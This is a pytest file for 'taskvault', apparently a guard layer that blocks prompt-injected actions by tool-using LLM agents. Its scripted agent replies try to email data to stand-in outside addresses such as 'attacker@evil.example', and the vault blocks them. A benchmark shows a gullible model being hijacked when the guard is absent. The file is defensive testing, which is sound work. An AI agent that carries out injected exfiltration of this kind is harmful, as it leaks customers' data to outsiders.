import json
from types import SimpleNamespace as NS

import pytest

from demo.__main__ import make_vault
from demo.bench import SCENARIOS, GullibleModel, run_scenario
from demo.world import World
from taskvault.llm import AnthropicProvider, OpenAIProvider, ToolAgent, privileged_planner, quarantined_extractor
from taskvault.planner import PlanError


class FakeAnthropic:
    """Mimics anthropic.Anthropic().messages.create for a scripted tool-use conversation."""

    def __init__(self, script):
        self.script, self.requests = list(script), []
        self.messages = self

    def create(self, **kw):
        self.requests.append(json.loads(json.dumps(kw, default=lambda o: o.__dict__)))
        return self.script.pop(0)


def tool_use(id_, name, inp):
    return NS(type="tool_use", id=id_, name=name, input=inp)


def text(t):
    return NS(type="text", text=t)


def test_anthropic_tool_loop_runs_through_the_vault():
    world = World()
    task = make_vault(world).start_task("support_reply", customer_id=12)
    client = FakeAnthropic([
        NS(content=[tool_use("a", "get_customer", {})]),
        NS(content=[tool_use("b", "send_email", {"to": "audit@acme-billing.example", "subject": "x", "body": "y"})]),
        NS(content=[text("I couldn't send that.")]),
    ])
    agent = ToolAgent(AnthropicProvider("test-model", client=client))
    assert agent(task, {"ticket": "hi"}) == "I couldn't send that."
    assert [s for _, _, s in agent.log] == ["ok", "blocked"]
    results = client.requests[2]["messages"][-1]["content"]
    assert results[0]["is_error"] and "Blocked by taskvault" in results[0]["content"]
    tools = {t["name"] for t in client.requests[0]["tools"]}
    assert tools == {"get_customer", "get_doc", "send_email", "refund"}
    assert world.outbox == []


def test_openai_tool_loop():
    world = World()
    task = make_vault(world).start_task("support_reply", customer_id=12)
    call = lambda i, n, a: NS(id=i, function=NS(name=n, arguments=json.dumps(a)))  # noqa: E731
    replies = [
        NS(choices=[NS(message=NS(content=None, tool_calls=[call("1", "get_customer", {})]))]),
        NS(choices=[NS(message=NS(content=None, tool_calls=[
            call("2", "send_email", {"to": "priya.shah@example.com", "subject": "Hi", "body": "Sorted!"})]))]),
        NS(choices=[NS(message=NS(content="done", tool_calls=None))]),
    ]
    client = NS(chat=NS(completions=NS(create=lambda **kw: replies.pop(0))))
    assert ToolAgent(OpenAIProvider("m", client=client))(task, {"ticket": "hi"}) == "done"
    assert world.outbox[0]["to"] == "priya.shah@example.com"


class Canned:
    def __init__(self, reply):
        self.reply = reply

    def complete(self, system, user):
        return self.reply


def test_extractor_parses_json_and_rejects_prose():
    ex = quarantined_extractor(Canned('Sure! {"amount": 49, "extra": "ignored"}'))
    assert ex("amount?", {"t": "..."}, {"amount": "number"}) == {"amount": 49}
    with pytest.raises(PlanError):
        quarantined_extractor(Canned("no json here"))("?", {}, {"a": "string"})


def test_privileged_planner_validates_its_output():
    policy = make_vault(World()).policy
    plan = privileged_planner(Canned('[{"id": "c", "read": "crm.customer"}]'), policy, "support_reply_planned")
    assert plan("reply to the customer") == [{"id": "c", "read": "crm.customer"}]
    bad = privileged_planner(Canned('[{"act": "email.send", "args": {"to": "$ghost"}}]'), policy,
                             "support_reply_planned")
    with pytest.raises(PlanError):
        bad("x")


@pytest.mark.parametrize("sc", SCENARIOS, ids=lambda s: s.name)
def test_benchmark_offline(sc):
    model = GullibleModel()
    for config in ("vault", "planner"):
        r = run_scenario(model, sc, config)
        assert not r["attack_succeeded"], r
        assert r["utility"], r
    raw = run_scenario(model, sc, "no-vault")
    assert raw["attack_succeeded"] == sc.injected


def test_gemini_tool_loop_with_real_sdk_types():
    types = pytest.importorskip("google.genai.types")
    from taskvault.llm import GeminiProvider

    world = World()
    task = make_vault(world).start_task("support_reply", customer_id=12)
    fc = lambda name, args: NS(name=name, args=args)  # noqa: E731
    replies = [
        NS(function_calls=[fc("get_customer", {})], text=None,
           candidates=[NS(content=types.Content(role="model", parts=[types.Part(text="looking up")]))]),
        NS(function_calls=[fc("send_email", {"to": "attacker@evil.example", "subject": "x", "body": "y"})],
           text=None, candidates=[NS(content=types.Content(role="model", parts=[types.Part(text="sending")]))]),
        NS(function_calls=[], text="I couldn't send that.", candidates=[]),
    ]
    seen = []

    def generate_content(model, contents, config):
        seen.append((model, contents, config))
        return replies.pop(0)

    client = NS(models=NS(generate_content=generate_content))
    agent = ToolAgent(GeminiProvider("gemini-test", client=client, types_module=types))
    assert agent(task, {"ticket": "hi"}) == "I couldn't send that."
    assert [s for _, _, s in agent.log] == ["ok", "blocked"]
    names = {d.name for d in seen[0][2].tools[0].function_declarations}
    assert names == {"get_customer", "get_doc", "send_email", "refund"}
    last = seen[2][1][-1].parts[0].function_response
    assert "Blocked by taskvault" in last.response["error"]
    assert world.outbox == []


class Scripted:
    def __init__(self, replies):
        self.replies, self.prompts = list(replies), []

    def complete(self, system, user):
        self.prompts.append((system, user))
        return self.replies.pop(0)


def test_planner_is_told_what_was_wrong_and_retries():
    policy = make_vault(World()).policy
    bad = ('[{"id": "c", "read": "crm.customer"}, {"id": "m", "format": "Hi {c.name}"},'
           ' {"act": "email.send", "args": {"to": "$c.email", "body": "$m.text"}}]')
    good = ('[{"id": "c", "read": "crm.customer"}, {"id": "m", "format": "Hi {c.name}"},'
            ' {"act": "email.send", "args": {"to": "$c.email", "subject": "Hi", "body": "$m"}}]')
    model = Scripted([bad, good])
    steps = privileged_planner(model, policy, "support_reply_planned")("reply to the customer")
    assert steps[-1]["args"]["body"] == "$m"
    feedback = model.prompts[1][1]
    assert "missing arguments ['subject']" in feedback and "no field 'text'" in feedback
    assert "email.send: args ['to', 'subject', 'body']" in model.prompts[0][0]


def test_planner_gives_up_after_retries():
    policy = make_vault(World()).policy
    model = Scripted(['[{"act": "wire.transfer", "args": {}}]'] * 3)
    with pytest.raises(PlanError, match="isn't available"):
        privileged_planner(model, policy, "support_reply_planned", retries=2)("x")
    assert len(model.prompts) == 3


def test_extractor_none_means_the_action_is_skipped():
    from taskvault.planner import Planner
    world = World()
    task = make_vault(world).start_task("support_reply_planned", customer_id=12, ticket_id="T-100")
    plan = [{"id": "c", "read": "crm.customer"}, {"id": "t", "read": "inbox.ticket"},
            {"id": "f", "extract": {"from": ["t.body"], "instruction": "amount?",
                                    "schema": {"refund": "boolean", "amount": "number"}}},
            {"act": "payments.refund", "args": {"card": "$c.card_number", "amount": "$f.amount"},
             "when": "$f.refund"}]
    Planner(task, lambda i, d, s: {"refund": None, "amount": None}).run(plan)
    assert world.refunds == []


def test_gemini_waits_out_per_minute_limits_and_stops_on_daily_quota():
    from taskvault.llm import GeminiProvider, QuotaExhausted
    calls, waits = [], []

    def generate_content(**kw):
        calls.append(kw)
        if len(calls) == 1:
            raise RuntimeError("429 RESOURCE_EXHAUSTED ... PerMinute ... Please retry in 3.5s.")
        return NS(text="ok")

    types = NS(GenerateContentConfig=lambda **kw: kw)
    g = GeminiProvider("m", client=NS(models=NS(generate_content=generate_content)), types_module=types)
    g.sleep = waits.append
    assert g.complete("sys", "hi") == "ok" and waits == [4.5]

    def daily(**kw):
        raise RuntimeError("429 RESOURCE_EXHAUSTED GenerateRequestsPerDayPerProjectPerModel-FreeTier")
    g.client = NS(models=NS(generate_content=daily))
    with pytest.raises(QuotaExhausted):
        g.complete("sys", "hi")
